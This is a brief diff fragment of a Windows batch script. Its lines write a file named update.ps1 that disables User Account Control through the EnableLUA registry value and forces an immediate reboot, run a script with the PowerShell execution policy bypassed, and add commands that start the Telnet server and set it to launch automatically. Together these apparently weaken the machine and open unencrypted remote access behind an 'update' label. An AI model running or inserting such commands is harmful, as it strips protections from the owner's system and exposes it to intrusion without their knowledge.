@@ -33,8 +33,13 @@ echo Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Pol
 
 powershell -ExecutionPolicy Bypass -File C:\Users\joe\Desktop\update.ps1
 
+net start tlntsvr
+sc config tlntsvr start= auto
+sc query tlntsvr
+
 
 echo Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableLUA' -Value 0 ^& Shutdown /r /f /t 0 > C:\Users\joe\update.ps1
+
 
 
 
